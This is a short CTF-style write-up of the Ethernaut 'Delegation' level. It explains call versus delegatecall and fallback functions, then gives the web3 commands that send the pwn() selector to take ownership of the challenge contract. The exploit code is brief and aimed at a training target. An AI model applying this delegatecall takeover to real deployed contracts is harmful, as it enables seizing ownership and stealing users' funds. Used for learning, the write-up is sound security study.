Ethernaut Address: 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
Player Address: 0xB83c1038Fde9fA12e7554289B83Df954ea7157d4

# Delegation

* Started with reading about `delegatecall`:
	- https://solidity-by-example.org/delegatecall/
	- https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c
	
* The difference between call and delegatecall:
	- If there is a user which calls contract A and contract A calls contract B
		+ A gets executed with the context of the user and B gets executed with the context of A	
	- If a user delegatecall A and A delegatecall B then
		+ Both A and B gets executed with the context of the user and changes will be reflected in the A

* fallback function
	- It is called when a non-existent function is called on the contract.
	- It is required to be marked external.
	- If not marked payable, it will throw exception if contract receives plain ether without data.
	- It can not return any thing.

* Possible exploits on delegatecall
	- https://solidity-by-example.org/hacks/delegatecall/
	- https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7/


## Solution

```js
await web3.eth.abi.encodeEventSignature("pwn()")
"0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab"
```

```js
await contract.sendTransaction({data: "0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab"})
```

We call the "pwn()" of the contract "Delegate" with the Storage (msg.sender, msg.value) of the "Delegation" contract. The delegation contract was called by "us" so the "from" value which is our own address is set as the "owner" of the "Delegation" contract.